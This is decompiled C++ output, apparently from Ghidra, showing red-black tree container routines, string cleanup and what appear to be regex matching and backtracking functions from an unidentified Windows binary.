// WARNING: Variable defined which should be unmapped: param_1

undefined4 * __thiscall FUN_00409f4d(void *this,undefined4 *param_1,int **param_2,int **param_3)

{
  int **ppiVar1;
  int *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415e91;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_14 = (int *)this;
  if (((*(int *)((int)this + 0xc) == 0) ||
      (ExceptionList = &local_10, param_2 != (int **)**(int ***)((int)this + 4))) ||
     (ExceptionList = &local_10, param_3 != *(int ***)((int)this + 4))) {
    while (ppiVar1 = param_2, param_2 != param_3) {
      FUN_0040a42b((int *)&param_2);
      FUN_0040a05c(this,&local_14,ppiVar1);
    }
    *param_1 = param_2;
  }
  else {
    ExceptionList = &local_10;
    std::_Lockit::_Lockit((_Lockit *)&param_3);
    local_8 = 0;
    FUN_0040a331(*(int **)(*(int *)((int)this + 4) + 4));
    local_8 = 0xffffffff;
    *(undefined4 *)(*(int *)((int)this + 4) + 4) = DAT_0041c9ac;
    *(undefined4 *)((int)this + 0xc) = 0;
    *(undefined4 *)*(undefined4 *)((int)this + 4) = *(undefined4 *)((int)this + 4);
    *(int *)(*(int *)((int)this + 4) + 8) = *(int *)((int)this + 4);
    *param_1 = **(undefined4 **)((int)this + 4);
    std::_Lockit::~_Lockit((_Lockit *)&param_3);
  }
  ExceptionList = local_10;
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall
FUN_00409ff7(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_24 [20];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415ea5;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_24,false);
  local_8 = 0;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::swap
            (local_24,param_1);
  local_8 = 0xffffffff;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_24,true);
  FUN_004043d3(*(undefined4 **)(param_1 + 0x10));
  FUN_004043d3(*(undefined4 **)(param_1 + 0x14));
  *(undefined4 *)(param_1 + 0x14) = 0;
  *(undefined4 *)(param_1 + 0x10) = 0;
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

int ** __thiscall FUN_0040a05c(void *this,int **param_1,int **param_2)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int iVar4;
  int *piVar5;
  int **ppiVar6;
  _Lockit local_24 [4];
  _Lockit local_20 [4];
  _Lockit local_1c [4];
  int **local_18;
  int **local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  ppiVar1 = param_2;
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415eb9;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_18 = (int **)this;
  FUN_0040a42b((int *)&param_2);
  local_14 = ppiVar1;
  std::_Lockit::_Lockit(local_24);
  ppiVar6 = (int **)*ppiVar1;
  local_8 = 0;
  if (ppiVar6 == DAT_0041c9ac) {
    ppiVar6 = (int **)ppiVar1[2];
LAB_0040a142:
    ppiVar6[1] = local_14[1];
    if (*(int ***)(*(int *)((int)this + 4) + 4) == ppiVar1) {
      *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar6;
    }
    else {
      piVar5 = ppiVar1[1];
      if ((int **)*piVar5 == ppiVar1) {
        *piVar5 = (int)ppiVar6;
      }
      else {
        piVar5[2] = (int)ppiVar6;
      }
    }
    ppiVar3 = *(int ***)((int)this + 4);
    if ((int **)*ppiVar3 == ppiVar1) {
      if ((int **)ppiVar1[2] == DAT_0041c9ac) {
        local_18 = (int **)ppiVar1[1];
      }
      else {
        local_18 = ppiVar6;
        std::_Lockit::_Lockit(local_20);
        ppiVar3 = (int **)*ppiVar6;
        while (ppiVar2 = ppiVar3, ppiVar2 != DAT_0041c9ac) {
          local_18 = ppiVar2;
          ppiVar3 = (int **)*ppiVar2;
        }
        std::_Lockit::~_Lockit(local_20);
        ppiVar3 = *(int ***)((int)this + 4);
      }
      *ppiVar3 = (int *)local_18;
    }
    local_18 = *(int ***)((int)this + 4);
    if (*(int ***)((int)local_18 + 8) == ppiVar1) {
      if ((int **)*ppiVar1 == DAT_0041c9ac) {
        *(int **)((int)local_18 + 8) = ppiVar1[1];
      }
      else {
        iVar4 = FUN_0040a50b((int)ppiVar6);
        *(int *)((int)local_18 + 8) = iVar4;
      }
    }
  }
  else {
    ppiVar3 = (int **)ppiVar1[2];
    if (ppiVar3 == DAT_0041c9ac) goto LAB_0040a142;
    std::_Lockit::_Lockit(local_1c);
    ppiVar6 = (int **)*ppiVar3;
    while (ppiVar2 = ppiVar6, ppiVar2 != DAT_0041c9ac) {
      ppiVar3 = ppiVar2;
      ppiVar6 = (int **)*ppiVar2;
    }
    std::_Lockit::~_Lockit(local_1c);
    ppiVar6 = (int **)ppiVar3[2];
    this = local_18;
    local_14 = ppiVar3;
    if (ppiVar3 == ppiVar1) goto LAB_0040a142;
    (*ppiVar1)[1] = (int)ppiVar3;
    *ppiVar3 = *ppiVar1;
    if (ppiVar3 == (int **)ppiVar1[2]) {
      ppiVar6[1] = (int *)ppiVar3;
    }
    else {
      ppiVar6[1] = ppiVar3[1];
      *ppiVar3[1] = (int)ppiVar6;
      ppiVar3[2] = ppiVar1[2];
      ppiVar1[2][1] = (int)ppiVar3;
    }
    if (*(int ***)(*(int *)((int)local_18 + 4) + 4) == ppiVar1) {
      *(int ***)(*(int *)((int)local_18 + 4) + 4) = ppiVar3;
    }
    else {
      ppiVar2 = (int **)ppiVar1[1];
      if ((int **)*ppiVar2 == ppiVar1) {
        *ppiVar2 = (int *)ppiVar3;
      }
      else {
        ppiVar2[2] = (int *)ppiVar3;
      }
    }
    local_14 = ppiVar1;
    ppiVar3[1] = ppiVar1[1];
    piVar5 = ppiVar3[10];
    ppiVar3[10] = ppiVar1[10];
    ppiVar1[10] = piVar5;
  }
  if (local_14[10] != (int *)0x1) {
LAB_0040a2f0:
    FUN_0040a59c((int)(local_14 + 3));
    operator_delete(local_14);
    *(int *)((int)this + 0xc) = *(int *)((int)this + 0xc) + -1;
    local_8 = 0xffffffff;
    *param_1 = (int *)param_2;
    std::_Lockit::~_Lockit(local_24);
    ExceptionList = local_10;
    return param_1;
  }
LAB_0040a1e5:
  if ((ppiVar6 == *(int ***)(*(int *)((int)this + 4) + 4)) || (ppiVar6[10] != (int *)0x1))
  goto LAB_0040a2ed;
  ppiVar1 = (int **)ppiVar6[1];
  if (ppiVar6 == (int **)*ppiVar1) {
    piVar5 = ppiVar1[2];
    if (piVar5[10] == 0) {
      piVar5[10] = 1;
      ppiVar6[1][10] = 0;
      FUN_0040a4af(this,ppiVar6[1]);
      piVar5 = (int *)ppiVar6[1][2];
    }
    if ((*(int *)(*piVar5 + 0x28) != 1) || (*(int *)(piVar5[2] + 0x28) != 1)) {
      if (*(int *)(piVar5[2] + 0x28) == 1) {
        *(undefined4 *)(*piVar5 + 0x28) = 1;
        piVar5[10] = 0;
        FUN_0040a53e(this,piVar5);
        piVar5 = (int *)ppiVar6[1][2];
      }
      piVar5[10] = ppiVar6[1][10];
      ppiVar6[1][10] = 1;
      *(undefined4 *)(piVar5[2] + 0x28) = 1;
      FUN_0040a4af(this,ppiVar6[1]);
LAB_0040a2ed:
      ppiVar6[10] = (int *)0x1;
      goto LAB_0040a2f0;
    }
  }
  else {
    piVar5 = *ppiVar1;
    if (piVar5[10] == 0) {
      piVar5[10] = 1;
      ppiVar6[1][10] = 0;
      FUN_0040a53e(this,ppiVar6[1]);
      piVar5 = (int *)*ppiVar6[1];
    }
    if ((*(int *)(piVar5[2] + 0x28) != 1) || (*(int *)(*piVar5 + 0x28) != 1)) {
      if (*(int *)(*piVar5 + 0x28) == 1) {
        *(undefined4 *)(piVar5[2] + 0x28) = 1;
        piVar5[10] = 0;
        FUN_0040a4af(this,piVar5);
        piVar5 = (int *)*ppiVar6[1];
      }
      piVar5[10] = ppiVar6[1][10];
      ppiVar6[1][10] = 1;
      *(undefined4 *)(*piVar5 + 0x28) = 1;
      FUN_0040a53e(this,ppiVar6[1]);
      goto LAB_0040a2ed;
    }
  }
  piVar5[10] = 0;
  ppiVar6 = (int **)ppiVar6[1];
  goto LAB_0040a1e5;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void FUN_0040a331(int *param_1)

{
  int *piVar1;
  _Lockit local_14 [4];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415ecd;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  std::_Lockit::_Lockit(local_14);
  local_8 = 0;
  if (param_1 != DAT_0041c9ac) {
    do {
      FUN_0040a331((int *)param_1[2]);
      piVar1 = (int *)*param_1;
      FUN_0040a59c((int)(param_1 + 3));
      operator_delete(param_1);
      param_1 = piVar1;
    } while (piVar1 != DAT_0041c9ac);
  }
  local_8 = 0xffffffff;
  std::_Lockit::~_Lockit(local_14);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0040a3a0(int param_1)

{
  undefined4 *puVar1;
  void *pvVar2;
  int local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415ee1;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_14 = param_1;
  std::_Lockit::_Lockit((_Lockit *)&local_14);
  local_8 = 0;
  if (DAT_0041c9ac == (undefined4 *)0x0) {
    DAT_0041c9ac = (undefined4 *)operator_new(0x2c);
    DAT_0041c9ac[1] = 0;
    DAT_0041c9ac[10] = 1;
    *DAT_0041c9ac = 0;
    DAT_0041c9ac[2] = 0;
  }
  puVar1 = DAT_0041c9ac;
  _DAT_0041c9b0 = _DAT_0041c9b0 + 1;
  pvVar2 = operator_new(0x2c);
  local_8 = 0xffffffff;
  *(undefined4 **)((int)pvVar2 + 4) = puVar1;
  *(undefined4 *)((int)pvVar2 + 0x28) = 0;
  *(void **)(param_1 + 4) = pvVar2;
  *(undefined4 *)(param_1 + 0xc) = 0;
  *(void **)pvVar2 = pvVar2;
  *(int *)(*(int *)(param_1 + 4) + 8) = *(int *)(param_1 + 4);
  std::_Lockit::~_Lockit((_Lockit *)&local_14);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040a42b(int *param_1)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415ef5;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_18 = param_1;
  local_14 = param_1;
  std::_Lockit::_Lockit((_Lockit *)&local_18);
  iVar3 = *param_1;
  local_8 = 0;
  puVar4 = *(undefined4 **)(iVar3 + 8);
  if (puVar4 == DAT_0041c9ac) {
    while (iVar3 = *(int *)(iVar3 + 4), *param_1 == *(int *)(iVar3 + 8)) {
      *param_1 = iVar3;
    }
    if (*(int *)(*param_1 + 8) != iVar3) {
      *param_1 = iVar3;
    }
  }
  else {
    std::_Lockit::_Lockit((_Lockit *)&local_14);
    puVar1 = (undefined4 *)*puVar4;
    while (puVar2 = puVar1, puVar2 != DAT_0041c9ac) {
      puVar4 = puVar2;
      puVar1 = (undefined4 *)*puVar2;
    }
    std::_Lockit::~_Lockit((_Lockit *)&local_14);
    *param_1 = (int)puVar4;
  }
  local_8 = 0xffffffff;
  std::_Lockit::~_Lockit((_Lockit *)&local_18);
  ExceptionList = local_10;
  return;
}



void __thiscall FUN_0040a4af(void *this,int *param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  void *local_8;
  
  local_8 = this;
  std::_Lockit::_Lockit((_Lockit *)&local_8);
  ppiVar1 = (int **)param_1[2];
  param_1[2] = (int)*ppiVar1;
  if (*ppiVar1 != DAT_0041c9ac) {
    (*ppiVar1)[1] = (int)param_1;
  }
  ppiVar1[1] = (int *)param_1[1];
  if (param_1 == *(int **)(*(int *)((int)this + 4) + 4)) {
    *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar1;
  }
  else {
    ppiVar2 = (int **)param_1[1];
    if (param_1 == *ppiVar2) {
      *ppiVar2 = (int *)ppiVar1;
    }
    else {
      ppiVar2[2] = (int *)ppiVar1;
    }
  }
  *ppiVar1 = param_1;
  param_1[1] = (int)ppiVar1;
  std::_Lockit::~_Lockit((_Lockit *)&local_8);
  return;
}



int __cdecl FUN_0040a50b(int param_1)

{
  int iVar1;
  int iVar2;
  _Lockit local_8 [4];
  
  std::_Lockit::_Lockit(local_8);
  iVar1 = *(int *)(param_1 + 8);
  while (iVar2 = iVar1, iVar2 != DAT_0041c9ac) {
    param_1 = iVar2;
    iVar1 = *(int *)(iVar2 + 8);
  }
  std::_Lockit::~_Lockit(local_8);
  return param_1;
}



void __thiscall FUN_0040a53e(void *this,int *param_1)

{
  int iVar1;
  int *piVar2;
  void *local_8;
  
  local_8 = this;
  std::_Lockit::_Lockit((_Lockit *)&local_8);
  iVar1 = *param_1;
  *param_1 = *(int *)(iVar1 + 8);
  if (*(int *)(iVar1 + 8) != DAT_0041c9ac) {
    *(int **)(*(int *)(iVar1 + 8) + 4) = param_1;
  }
  *(int *)(iVar1 + 4) = param_1[1];
  if (param_1 == *(int **)(*(int *)((int)this + 4) + 4)) {
    *(int *)(*(int *)((int)this + 4) + 4) = iVar1;
  }
  else {
    piVar2 = (int *)param_1[1];
    if (param_1 == (int *)piVar2[2]) {
      piVar2[2] = iVar1;
    }
    else {
      *piVar2 = iVar1;
    }
  }
  *(int **)(iVar1 + 8) = param_1;
  param_1[1] = iVar1;
  std::_Lockit::~_Lockit((_Lockit *)&local_8);
  return;
}



void __cdecl FUN_0040a59c(int param_1)

{
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             (param_1 + 1),true);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __cdecl FUN_0040a5b8(char *param_1,char *param_2,uint param_3,void **param_4)

{
  undefined4 *puVar1;
  void *this;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415f0e;
  local_10 = ExceptionList;
  if ((int)param_2 - (int)param_1 == 1) {
    ExceptionList = &local_10;
    puVar1 = FUN_00409bc5(*param_1,param_3,param_4);
  }
  else {
    if ((param_3 & 1) == 0) {
      ExceptionList = &local_10;
      puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
      if (puVar1 != (undefined4 *)0x0) {
        puVar1[1] = 0;
        puVar1[2] = param_1;
        puVar1[3] = param_2;
        puVar1[4] = (int)param_2 - (int)param_1;
        *puVar1 = &DAT_00417e68;
        ExceptionList = local_10;
        return puVar1;
      }
    }
    else if ((param_3 & 1) == 1) {
      ExceptionList = &local_10;
      this = (void *)FUN_0040507f(*param_4,0x18);
      local_8 = 0;
      if (this != (void *)0x0) {
        puVar1 = FUN_0040db46(this,param_1,param_2,param_4);
        ExceptionList = local_10;
        return puVar1;
      }
    }
    puVar1 = (undefined4 *)0x0;
  }
  ExceptionList = local_10;
  return puVar1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

uint __cdecl FUN_0040a64e(int *param_1,uint param_2,undefined4 param_3)

{
  void *this;
  uint uVar1;
  char cVar2;
  undefined4 uVar3;
  uint uVar4;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  uVar1 = param_2;
  puStack_c = &LAB_00415f20;
  local_10 = ExceptionList;
  this = *(void **)(param_2 + 0x20);
  uVar4 = *(uint *)((int)this + 0x418);
  local_8 = 0;
  ExceptionList = &local_10;
  *(undefined4 *)(param_2 + 8) = param_3;
  param_2 = uVar4;
  cVar2 = (**(code **)(*param_1 + 8))(uVar1);
  if (cVar2 == '\0') {
    param_2 = param_2 & 0xffffff;
  }
  else {
    while (*(int *)(uVar1 + 0x10) != 0) {
      FUN_0040ba4e(this,&param_1);
      param_1 = *(int **)(uVar1 + 0x10);
      cVar2 = (**(code **)(*param_1 + 8))(uVar1);
      while (cVar2 == '\0') {
        if (param_2 == *(uint *)((int)this + 0x418)) {
          local_8 = 0xffffffff;
          uVar4 = FUN_0040a704(this,uVar4);
          ExceptionList = local_10;
          return uVar4 & 0xffffff00;
        }
        FUN_00413b05(this,&param_1);
        cVar2 = (**(code **)(*param_1 + 0x10))(uVar1);
      }
    }
    param_2 = CONCAT13(1,(undefined3)param_2);
  }
  local_8 = 0xffffffff;
  uVar3 = FUN_0040a704(this,uVar4);
  ExceptionList = local_10;
  return CONCAT31((int3)((uint)uVar3 >> 8),param_2._3_1_);
}



void __thiscall FUN_0040a704(void *this,uint param_1)

{
  int iVar1;
  
  while( true ) {
    iVar1 = *(int *)((int)this + 0x410);
    if ((iVar1 + 0x10U <= param_1) && (param_1 <= *(uint *)(iVar1 + 0xc))) break;
    *(uint *)(iVar1 + 8) = iVar1 + 0x10U;
    *(undefined4 *)((int)this + 0x410) = **(undefined4 **)((int)this + 0x410);
  }
  *(int *)((int)this + 0x414) = *(int *)((int)this + 0x410) + 0x10;
  *(uint *)(*(int *)((int)this + 0x410) + 8) = param_1;
  *(uint *)((int)this + 0x418) = param_1;
  *(undefined4 *)((int)this + 0x41c) = *(undefined4 *)(*(int *)((int)this + 0x410) + 0xc);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

uint __cdecl FUN_0040a759(int *param_1,uint param_2,undefined4 param_3)

{
  void *this;
  uint uVar1;
  char cVar2;
  undefined4 uVar3;
  uint uVar4;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  uVar1 = param_2;
  puStack_c = &LAB_00415f34;
  local_10 = ExceptionList;
  this = *(void **)(param_2 + 0x20);
  uVar4 = *(uint *)((int)this + 0x418);
  local_8 = 0;
  ExceptionList = &local_10;
  *(undefined4 *)(param_2 + 8) = param_3;
  param_2 = uVar4;
  cVar2 = (**(code **)(*param_1 + 0xc))(uVar1);
  if (cVar2 == '\0') {
    param_2 = param_2 & 0xffffff;
  }
  else {
    while (*(int *)(uVar1 + 0x10) != 0) {
      FUN_0040ba4e(this,&param_1);
      param_1 = *(int **)(uVar1 + 0x10);
      cVar2 = (**(code **)(*param_1 + 0xc))(uVar1);
      while (cVar2 == '\0') {
        if (param_2 == *(uint *)((int)this + 0x418)) {
          uVar4 = FUN_0040a704(this,uVar4);
          ExceptionList = local_10;
          return uVar4 & 0xffffff00;
        }
        FUN_00413b05(this,&param_1);
        cVar2 = (**(code **)(*param_1 + 0x14))(uVar1);
      }
    }
    param_2 = CONCAT13(1,(undefined3)param_2);
  }
  uVar3 = FUN_0040a704(this,uVar4);
  ExceptionList = local_10;
  return CONCAT31((int3)((uint)uVar3 >> 8),param_2._3_1_);
}



uint __thiscall FUN_0040a807(void *this,int *param_1,char *param_2)

{
  char **ppcVar1;
  char *pcVar2;
  uint uVar3;
  int iVar4;
  char *pcVar5;
  char *pcVar6;
  undefined4 *puVar7;
  
  pcVar6 = *(char **)((int)this + 0x1c);
  if (pcVar6 != (char *)0x0) {
    pcVar5 = pcVar6;
    if (((char *)param_1[1] == param_2) || (pcVar2 = *(char **)((int)this + 0x20), pcVar2 == pcVar6)
       ) goto LAB_0040a873;
    uVar3 = (uint)pcVar6 >> 8;
    do {
      if (*pcVar6 == *param_2) break;
      pcVar6 = pcVar6 + 1;
    } while (pcVar6 != pcVar2);
    pcVar5 = (char *)CONCAT31((int3)uVar3,*param_2);
    if (pcVar2 == pcVar6) goto LAB_0040a873;
  }
  if (*(int *)((int)this + 0x10) == -1) {
    pcVar5 = (char *)0xffffffff;
    for (puVar7 = *(undefined4 **)((int)this + 0xc); puVar7 != (undefined4 *)0x0;
        puVar7 = (undefined4 *)puVar7[1]) {
      pcVar5 = (char *)(***(code ***)*puVar7)(param_1,param_2);
      if ((char)pcVar5 != '\0') goto LAB_0040a896;
    }
  }
  else {
    iVar4 = *(int *)((int)this + 0x10) * 0x1a;
    ppcVar1 = (char **)(iVar4 + 9 + *param_1);
    pcVar6 = *(char **)(iVar4 + 9 + *param_1);
    *ppcVar1 = param_2;
    for (puVar7 = *(undefined4 **)((int)this + 0xc); puVar7 != (undefined4 *)0x0;
        puVar7 = (undefined4 *)puVar7[1]) {
      pcVar5 = (char *)(***(code ***)*puVar7)(param_1,param_2);
      if ((char)pcVar5 != '\0') {
LAB_0040a896:
        return CONCAT31((int3)((uint)pcVar5 >> 8),1);
      }
    }
    *ppcVar1 = pcVar6;
    pcVar5 = pcVar6;
  }
LAB_0040a873:
  return (uint)pcVar5 & 0xffffff00;
}



uint __thiscall FUN_0040a89a(void *this,int *param_1,char *param_2)

{
  char **ppcVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  int **ppiVar5;
  
  pcVar3 = *(char **)((int)this + 0x1c);
  if (pcVar3 == (char *)0x0) {
LAB_0040a8c2:
    if (*(int *)((int)this + 0x10) == -1) {
      pcVar3 = (char *)0xffffffff;
      for (ppiVar5 = *(int ***)((int)this + 0xc); ppiVar5 != (int **)0x0;
          ppiVar5 = (int **)ppiVar5[1]) {
        pcVar3 = (char *)(**(code **)(**ppiVar5 + 4))(param_1,param_2);
        if ((char)pcVar3 != '\0') goto LAB_0040a928;
      }
    }
    else {
      iVar4 = *(int *)((int)this + 0x10) * 0x1a;
      ppcVar1 = (char **)(iVar4 + 9 + *param_1);
      pcVar2 = *(char **)(iVar4 + 9 + *param_1);
      *ppcVar1 = param_2;
      for (ppiVar5 = *(int ***)((int)this + 0xc); ppiVar5 != (int **)0x0;
          ppiVar5 = (int **)ppiVar5[1]) {
        pcVar3 = (char *)(**(code **)(**ppiVar5 + 4))(param_1,param_2);
        if ((char)pcVar3 != '\0') {
LAB_0040a928:
          return CONCAT31((int3)((uint)pcVar3 >> 8),1);
        }
      }
      *ppcVar1 = pcVar2;
      pcVar3 = pcVar2;
    }
  }
  else if (*param_2 != '\0') {
    for (; *(char **)((int)this + 0x20) != pcVar3; pcVar3 = pcVar3 + 1) {
      if (*pcVar3 == *param_2) {
        if (*(char **)((int)this + 0x20) != pcVar3) goto LAB_0040a8c2;
        break;
      }
    }
  }
  return (uint)pcVar3 & 0xffffff00;
}



uint __thiscall FUN_0040a92c(void *this,int *param_1)

{
  char *pcVar1;
  int iVar2;
  char *pcVar3;
  uint uVar4;
  
  pcVar3 = *(char **)((int)this + 0x1c);
  if (pcVar3 == (char *)0x0) {
LAB_0040a95e:
    FUN_0040be82(this,param_1);
    iVar2 = **(int **)((int)this + 0xc);
    param_1[4] = iVar2;
    uVar4 = CONCAT31((int3)((uint)iVar2 >> 8),1);
  }
  else {
    if (((char *)param_1[1] != (char *)param_1[2]) &&
       (pcVar1 = *(char **)((int)this + 0x20), pcVar1 != pcVar3)) {
      do {
        if (*pcVar3 == *(char *)param_1[2]) break;
        pcVar3 = pcVar3 + 1;
      } while (pcVar3 != pcVar1);
      if (pcVar1 != pcVar3) goto LAB_0040a95e;
    }
    uVar4 = (uint)pcVar3 & 0xffffff00;
  }
  return uVar4;
}



uint __thiscall FUN_0040a976(void *this,int *param_1)

{
  char *pcVar1;
  int iVar2;
  char *pcVar3;
  uint uVar4;
  
  pcVar3 = *(char **)((int)this + 0x1c);
  if (pcVar3 == (char *)0x0) {
LAB_0040a9a8:
    FUN_0040be82(this,param_1);
    iVar2 = **(int **)((int)this + 0xc);
    param_1[4] = iVar2;
    uVar4 = CONCAT31((int3)((uint)iVar2 >> 8),1);
  }
  else {
    if ((*(char *)param_1[2] != '\0') && (pcVar1 = *(char **)((int)this + 0x20), pcVar1 != pcVar3))
    {
      do {
        if (*pcVar3 == *(char *)param_1[2]) break;
        pcVar3 = pcVar3 + 1;
      } while (pcVar3 != pcVar1);
      if (pcVar1 != pcVar3) goto LAB_0040a9a8;
    }
    uVar4 = (uint)pcVar3 & 0xffffff00;
  }
  return uVar4;
}



uint __thiscall FUN_0040a9c0(void *this,int *param_1,int param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  undefined1 unaff_DI;
  void *local_8;
  
  puVar3 = (undefined4 *)&stack0xffffffec;
  puVar1 = (undefined4 *)&stack0xffffffec;
  iVar4 = *param_1;
  if (param_2 != *(int *)(iVar4 + 9)) {
    iVar5 = param_1[3];
    FUN_00415390(unaff_DI);
    iVar5 = iVar5 * 0x1a + iVar4;
    local_8 = this;
    for (; iVar4 != iVar5; iVar4 = iVar4 + 0x1a) {
      if (puVar1 != (undefined4 *)0x0) {
        *puVar1 = *(undefined4 *)(iVar4 + 9);
      }
      puVar1 = puVar1 + 1;
    }
    uVar2 = (***(code ***)param_1[7])(param_1,param_2);
    if ((char)uVar2 == '\0') {
      return uVar2 & 0xffffff00;
    }
    iVar4 = *param_1;
    iVar5 = param_1[3] * 0x1a + iVar4;
    for (; iVar4 != iVar5; iVar4 = iVar4 + 0x1a) {
      *(undefined4 *)(iVar4 + 9) = *puVar3;
      puVar3 = puVar3 + 1;
    }
    param_2 = *(int *)(*param_1 + 4);
    this = local_8;
  }
  uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
  return uVar2;
}



uint __thiscall FUN_0040aa54(void *this,int *param_1,int param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  undefined1 unaff_DI;
  void *local_8;
  
  puVar3 = (undefined4 *)&stack0xffffffec;
  puVar1 = (undefined4 *)&stack0xffffffec;
  iVar4 = *param_1;
  if (param_2 != *(int *)(iVar4 + 9)) {
    iVar5 = param_1[3];
    FUN_00415390(unaff_DI);
    iVar5 = iVar5 * 0x1a + iVar4;
    local_8 = this;
    for (; iVar4 != iVar5; iVar4 = iVar4 + 0x1a) {
      if (puVar1 != (undefined4 *)0x0) {
        *puVar1 = *(undefined4 *)(iVar4 + 9);
      }
      puVar1 = puVar1 + 1;
    }
    uVar2 = (**(code **)(*(int *)param_1[7] + 4))(param_1,param_2);
    if ((char)uVar2 == '\0') {
      return uVar2 & 0xffffff00;
    }
    iVar4 = *param_1;
    iVar5 = param_1[3] * 0x1a + iVar4;
    for (; iVar4 != iVar5; iVar4 = iVar4 + 0x1a) {
      *(undefined4 *)(iVar4 + 9) = *puVar3;
      puVar3 = puVar3 + 1;
    }
    param_2 = *(int *)(*param_1 + 4);
    this = local_8;
  }
  uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
  return uVar2;
}



uint __thiscall FUN_0040aaea(void *this,int *param_1)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  piVar1 = param_1 + 2;
  FUN_0040ba4e((void *)param_1[8],piVar1);
  if (*piVar1 != *(int *)(*param_1 + 9)) {
    FUN_0040bec6(param_1);
    uVar3 = FUN_0040a64e((int *)param_1[7],(uint)param_1,*piVar1);
    if ((char)uVar3 == '\0') {
      FUN_0040befb(param_1);
      uVar3 = FUN_00413b05((void *)param_1[8],piVar1);
      return uVar3 & 0xffffff00;
    }
    FUN_0040befb(param_1);
  }
  iVar2 = *(int *)((int)this + 4);
  param_1[4] = iVar2;
  return CONCAT31((int3)((uint)iVar2 >> 8),1);
}



uint __thiscall FUN_0040ab50(void *this,int *param_1)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  piVar1 = param_1 + 2;
  FUN_0040ba4e((void *)param_1[8],piVar1);
  if (*piVar1 != *(int *)(*param_1 + 9)) {
    FUN_0040bec6(param_1);
    uVar3 = FUN_0040a759((int *)param_1[7],(uint)param_1,*piVar1);
    if ((char)uVar3 == '\0') {
      FUN_0040befb(param_1);
      uVar3 = FUN_00413b05((void *)param_1[8],piVar1);
      return uVar3 & 0xffffff00;
    }
    FUN_0040befb(param_1);
  }
  iVar2 = *(int *)((int)this + 4);
  param_1[4] = iVar2;
  return CONCAT31((int3)((uint)iVar2 >> 8),1);
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040abb6(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415f48;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00417ab0;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



int __thiscall FUN_0040abee(void *this,int *param_1,undefined4 param_2)

{
  undefined uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  char cVar4;
  uint3 uVar5;
  undefined4 *puVar6;
  
  if (*(int *)((int)this + 0x10) == -1) {
    cVar4 = '\0';
    uVar5 = 0;
    (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if (cVar4 != '\0') goto LAB_0040ac55;
  }
  else {
    puVar6 = (undefined4 *)(*(int *)((int)this + 0x10) * 0x1a + *param_1);
    uVar1 = *(undefined *)(puVar6 + 2);
    uVar2 = *puVar6;
    uVar3 = puVar6[1];
    *(undefined *)(puVar6 + 2) = 1;
    *puVar6 = *(undefined4 *)((int)puVar6 + 9);
    puVar6[1] = param_2;
